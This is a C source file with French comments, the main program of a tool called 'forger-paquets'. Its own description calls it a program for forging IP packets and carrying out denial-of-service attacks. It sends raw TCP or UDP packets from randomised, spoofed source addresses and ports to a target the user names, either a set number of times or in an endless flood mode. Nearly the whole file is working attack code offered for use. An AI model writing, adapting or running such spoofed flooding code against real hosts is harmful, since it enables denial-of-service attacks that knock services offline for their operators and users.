#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/ip.h>     // Déclarations entête IP
#include <netinet/tcp.h>    // Déclarations entête TCP
#include <netinet/udp.h>    // Déclarations entête UDP
#include <time.h>           // rand()
#include <argp.h>           // Traitement arguments et options

#include "traitementTCP.h"
#include "traitementUDP.h"
#include "randGen.h"
#include "checksum.h"
#include "pseudoHeader.h"
#include "stringIP.h"

const char *argp_program_version = "forger-paquets 0.1.0";


struct arguments {
    char *args[3];
    int verbose, flood; // -v -f
    char *outfile; // -o
    char *string1, *string2, *s_port, *s_ip, *count; // arguments pour -a -b -i -p -c
    char *d_ip, *protocole; // adresse IP destination, spécifiée par l'utilisateur
    unsigned short d_port; // port destination, spécifié par l'utilisateur
};

static struct argp_option options[] =
{
    {"verbose", 'v', 0, 0, "Produire sortie verbeuse"},
    {"sourceip",   'i', "S_IP", 0, "Spécifier l'adresse IP Source (Aléatoire si non spécifiée)"},
    {"sourceport",   'p', "S_PORT", 0, "Spécifier le Port Source (Aléatoire si non spécifié)"},
    {"output",  'o', "OUTFILE", 0, "Prendre OUTFILE comme sortie au lieu de la sortie standard"},
    {"flood",  'f', 0, 0, "Envoi des paquets le plus vite possible jusqu'à interruption du programme"},
    {"count",  'c', "COUNT", 0, "Spécifier le nombre de paquets à envoyer"},
    {0}
};

// PARSER

static error_t
parse_opt (int key, char *arg, struct argp_state *state)
{
  struct arguments *arguments = state->input;

  switch (key)
    {
    case 'v':
      arguments->verbose = 1;
      break;
    case 'i':
      arguments->s_ip = arg;
      break;
    case 'p':
      arguments->s_port = arg;
      break;
    case 'f':
      arguments->flood = 1;
      break;
    case 'c':
      arguments->count = arg;
      break;
    case 'o':
      arguments->outfile = arg;
      break;
    case ARGP_KEY_ARG:
      if (state->arg_num >= 3)
	{
	  argp_usage(state);
	}
      arguments->args[state->arg_num] = arg;
      break;
    case ARGP_KEY_END:
      if (state->arg_num < 3)
	{
	  argp_usage (state);
	}
      break;
    default:
      return ARGP_ERR_UNKNOWN;
    }
  return 0;
}

// ARGS_DOC

static char args_doc[] = "PROTOCOLE IP_DESTINATION PORT_DESTINATION";

// DOC

static char doc[] = "forger-paquets -- Un programme pour forger des paquets IP et mettre en oeuvre des attaques de déni de service.";

// ARGP STRUCTURE

static struct argp argp = {options, parse_opt, args_doc, doc};

int main (int argc, char **argv) {
    srand(time(NULL));

    struct arguments arguments;
    FILE *outstream;

    // ARGUMENTS PAR DÉFAUT

    arguments.outfile = NULL;
    //arguments.string1 = "";
    //arguments.string2 = "";
    arguments.verbose = 0;
    arguments.s_ip = NULL;
    arguments.s_port = 0;
    arguments.flood = 0;
    //arguments.protocole = "";
    //arguments.d_ip = "";
    //arguments.d_port = atoi(arguments.args[2]);

    // PARSING ARGUMENTS

    argp_parse(&argp, argc, argv, 0, 0, &arguments);

    // RENVOI OUTPUT

    if (arguments.outfile)
        outstream = fopen(arguments.outfile, "w");
    else
        outstream = stdout;

    // création du socket raw

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    unsigned short source_port;

    //représentation du paquet sous forme de datagramme
    char datagram[1024], source_ip[32], *data;//, *pseudogram;

    //initialiser le tampon à 0
    memset(datagram, 0, sizeof(datagram));

    //entete IP
    //struct iphdr *iph = (struct iphdr *)datagram;

    if (arguments.flood) {
        while(1) {                                                      // vv mettre dans une fonction pour alléger vv

            strcpy(source_ip, stringIP(rand()));

            if (arguments.s_ip)
                strcpy(source_ip, arguments.s_ip);

            source_port = randGen(1024, 65535); //générer port destination aléatoire entre 1024 et 65535

            if (arguments.s_port)
            source_port = atoi(arguments.s_port);

            if(strcmp(arguments.args[0], "udp") == 0) {
                traitementUDP(s, datagram, data, source_ip, arguments.args[1], source_port, atoi(arguments.args[2]));
            }

            else if(strcmp(arguments.args[0], "tcp") == 0) {
                traitementTCP(s, datagram, data, source_ip, arguments.args[1], source_port, atoi(arguments.args[2]));
            }

            // VERBOSE OUTPUT

            if (arguments.verbose) {
                if(s < 0) {
                    perror("erreur socket(), essayez sudo.");
                    exit(1);
                }
                fprintf (outstream, "PROTOCOLE \t\t: %s\n"
                                    "ADRESSE IP SOURCE \t: %s\n"
                                    "PORT SOURCE \t\t: %d\n"
                                    "ADRESSE IP DESTINATION \t: %s\n"
                                    "PORT DESTINATION \t: %d\n\n",
                                    arguments.args[0], source_ip, source_port, arguments.args[1], atoi(arguments.args[2]));
            }
        }
    }

    else if (arguments.count) {
        int i = 0;
        for(i = 0; i<atoi(arguments.count); i++) {                     // vv mettre dans une fonction pour alléger vv

            strcpy(source_ip, stringIP(rand()));

            if (arguments.s_ip)
                strcpy(source_ip, arguments.s_ip);

            source_port = randGen(1024, 65535); //générer port destination aléatoire entre 1024 et 65535

            if (arguments.s_port)
            source_port = atoi(arguments.s_port);

            if(strcmp(arguments.args[0], "udp") == 0) {
                traitementUDP(s, datagram, data, source_ip, arguments.args[1], source_port, atoi(arguments.args[2]));
            }

            else if(strcmp(arguments.args[0], "tcp") == 0) {
                traitementTCP(s, datagram, data, source_ip, arguments.args[1], source_port, atoi(arguments.args[2]));
            }

            // VERBOSE OUTPUT

            if (arguments.verbose) {
                if(s < 0) {
                    perror("erreur socket(), essayez sudo.");
                    exit(1);
                }
                fprintf (outstream, "PROTOCOLE \t\t: %s\n"
                                    "ADRESSE IP SOURCE \t: %s\n"
                                    "PORT SOURCE \t\t: %d\n"
                                    "ADRESSE IP DESTINATION \t: %s\n"
                                    "PORT DESTINATION \t: %d\n\n",
                                    arguments.args[0], source_ip, source_port, arguments.args[1], atoi(arguments.args[2]));
            }

        }
    }

    else {
        strcpy(source_ip, stringIP(rand()));

        if (arguments.s_ip)
            strcpy(source_ip, arguments.s_ip);

        source_port = randGen(1024, 65535); //générer port destination aléatoire entre 1024 et 65535

        if (arguments.s_port)
            source_port = atoi(arguments.s_port);

        if(strcmp(arguments.args[0], "udp") == 0) {
            traitementUDP(s, datagram, data, source_ip, arguments.args[1], source_port, atoi(arguments.args[2]));
        }

        else if(strcmp(arguments.args[0], "tcp") == 0) {
            traitementTCP(s, datagram, data, source_ip, arguments.args[1], source_port, atoi(arguments.args[2]));
        }

        // VERBOSE OUTPUT

        if (arguments.verbose) {
            if(s < 0) {
                perror("erreur socket(), essayez sudo.");
                exit(1);
            }
            fprintf (outstream, "PROTOCOLE \t\t: %s\n"
                                "ADRESSE IP SOURCE \t: %s\n"
                                "PORT SOURCE \t\t: %d\n"
                                "ADRESSE IP DESTINATION \t: %s\n"
                                "PORT DESTINATION \t: %d\n\n",
                                arguments.args[0], source_ip, source_port, arguments.args[1], atoi(arguments.args[2]));
        }

    }

    return 0;
}

